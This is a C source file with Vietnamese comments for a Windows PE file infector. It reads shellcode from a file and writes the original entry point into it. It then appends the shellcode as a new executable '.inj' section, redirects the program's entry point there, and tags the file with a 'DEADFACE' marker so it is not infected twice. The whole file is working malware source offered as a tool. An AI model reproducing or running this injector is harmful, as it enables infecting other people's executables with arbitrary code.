#include <stdio.h>
#include <windows.h>
#include <string.h>

#define SHELLCODE_FILE "shellcode.bin"
#define MAGIC_MARKER   "DEADFACE"
#define INJECT_SECTION_NAME ".inj"

// Căn lề section
DWORD align(DWORD size, DWORD align) {
    return ((size + align - 1) / align) * align;
}

int already_infected(BYTE* buffer, DWORD size) {
    for (DWORD i = 0; i < size - strlen(MAGIC_MARKER); i++) {
        if (memcmp(buffer + i, MAGIC_MARKER, strlen(MAGIC_MARKER)) == 0)
            return 1;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: injector.exe target.exe\n");
        return 1;
    }

    FILE* target = fopen(argv[1], "rb+");
    if (!target) {
        perror("Open target failed");
        return 1;
    }

    fseek(target, 0, SEEK_END);
    DWORD fsize = ftell(target);
    rewind(target);

    BYTE* buffer = malloc(fsize);
    fread(buffer, 1, fsize, target);

    if (already_infected(buffer, fsize)) {
        printf("File already infected.\n");
        free(buffer);
        fclose(target);
        return 1;
    }

    // Parse DOS + NT Header
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS32 nt = (PIMAGE_NT_HEADERS32)(buffer + dos->e_lfanew);

    DWORD old_OEP = nt->OptionalHeader.AddressOfEntryPoint;
    DWORD image_base = nt->OptionalHeader.ImageBase;
    DWORD file_align = nt->OptionalHeader.FileAlignment;
    DWORD section_align = nt->OptionalHeader.SectionAlignment;

    // Find last section
    PIMAGE_SECTION_HEADER last = IMAGE_FIRST_SECTION(nt);
    for (int i = 1; i < nt->FileHeader.NumberOfSections; i++) {
        last++;
    }

    // Load shellcode
    FILE* sc = fopen(SHELLCODE_FILE, "rb");
    if (!sc) {
        perror("Open shellcode failed");
        free(buffer);
        fclose(target);
        return 1;
    }

    fseek(sc, 0, SEEK_END);
    DWORD sc_size_raw = ftell(sc);
    rewind(sc);
    BYTE* sc_buf = malloc(sc_size_raw);
    fread(sc_buf, 1, sc_size_raw, sc);
    fclose(sc);

    // Ghi OEP vào shellcode
    DWORD saved_OEP_offset = 0; // bạn cần biết offset trong shellcode để ghi
    for (DWORD i = 0; i < sc_size_raw - 4; i++) {
        if (*(DWORD*)(sc_buf + i) == 0x00000000) {
            saved_OEP_offset = i;
            break;
        }
    }
    *(DWORD*)(sc_buf + saved_OEP_offset) = image_base + old_OEP;

    // Ghi marker vào cuối shellcode
    memcpy(sc_buf + sc_size_raw - strlen(MAGIC_MARKER), MAGIC_MARKER, strlen(MAGIC_MARKER));

    // Thêm section mới
    PIMAGE_SECTION_HEADER new_sec = last + 1;
    memset(new_sec, 0, sizeof(IMAGE_SECTION_HEADER));
    memcpy(new_sec->Name, INJECT_SECTION_NAME, strlen(INJECT_SECTION_NAME));
    new_sec->Misc.VirtualSize = align(sc_size_raw, section_align);
    new_sec->VirtualAddress = align(last->VirtualAddress + last->Misc.VirtualSize, section_align);
    new_sec->SizeOfRawData = align(sc_size_raw, file_align);
    new_sec->PointerToRawData = align(last->PointerToRawData + last->SizeOfRawData, file_align);
    new_sec->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    // Update PE Header
    nt->OptionalHeader.AddressOfEntryPoint = new_sec->VirtualAddress;
    nt->OptionalHeader.SizeOfImage = new_sec->VirtualAddress + new_sec->Misc.VirtualSize;
    nt->FileHeader.NumberOfSections++;

    // Mở rộng file để ghi section mới
    fseek(target, 0, SEEK_END);
    DWORD new_pos = new_sec->PointerToRawData;
    while (ftell(target) < new_pos) fputc(0x00, target);

    fwrite(sc_buf, 1, sc_size_raw, target);
    fseek(target, 0, SEEK_SET);
    fwrite(buffer, 1, fsize, target);

    printf("Injected shellcode at RVA: 0x%X\n", new_sec->VirtualAddress);
    fclose(target);
    free(buffer);
    free(sc_buf);
    return 0;
}
